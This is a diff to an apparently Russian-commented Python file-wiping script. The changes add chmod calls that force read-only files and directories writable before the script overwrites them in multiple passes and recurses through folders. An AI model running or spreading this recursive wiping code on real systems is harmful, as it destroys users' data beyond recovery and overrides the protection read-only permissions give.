@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import os
+import stat
 import shutil
 import random
 import socket
@@ -126,6 +127,9 @@ def secure_delete(path, passes=5):
     '''Функция принимает путь к файлу и количество прогонов (по умолчанирю 5)'''
 
     global success # Использование глобальной переменной success
+
+    os.chmod(path, stat.S_IWRITE)
+
     with open(path, "ba+") as delfile:
         length = delfile.tell() # Определение размера файла
     with open(path, "br+") as delfile:
@@ -153,6 +157,7 @@ def isFile(root_list):
 
             for l in list:
                 if (os.path.isdir(r+l)):
+                    os.chmod(f'{r+l}/' , stat.S_IWRITE)
                     isFile([f'{r+l}/'])
                 else:
                     secure_delete(f'{r+l}')
